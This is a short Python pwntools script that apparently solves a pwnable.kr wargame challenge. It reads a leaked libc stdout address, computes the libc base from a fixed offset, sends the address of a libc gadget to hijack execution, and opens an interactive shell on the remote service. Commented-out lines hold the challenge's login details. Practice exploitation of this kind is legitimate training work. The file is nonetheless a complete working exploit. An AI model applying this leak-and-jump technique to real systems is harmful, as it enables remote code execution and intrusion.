import IPython
from pwn import *
import ctypes

from utils import RemoteProcess, NetcatClient


def main():
    # conn = RemoteProcess(
    #     host='pwnable.kr',
    #     port=2222,
    #     user='exploitable',
    #     password='guest',
    #     exe='/home/exploitable/exploitable',
    #     verbose=True,
    #     gdb=True,
    # )
    conn = NetcatClient(
        host='pwnable.kr',
        port=9018,
        # user='exploitable',
        # password='guest',
        # exe='/home/exploitable/exploitable',
        verbose=True,
        # gdb=False,
    )
    with conn:

        stdout_addr = u32(conn.recv())
        libc_base = stdout_addr - 0x1b3d60
        print('libc_base =', hex(libc_base))

        # IPython.embed(header='~~ Exploit Development ~~', colors='neutral')

        libc_jump_offset = 0x0003AC6E
        conn.send(str(ctypes.c_int(libc_base + libc_jump_offset).value) + '\n')

        conn.interactive()
        # IPython.embed(header='~~ Exploit Development ~~', colors='neutral')


if __name__ == '__main__':
    main()
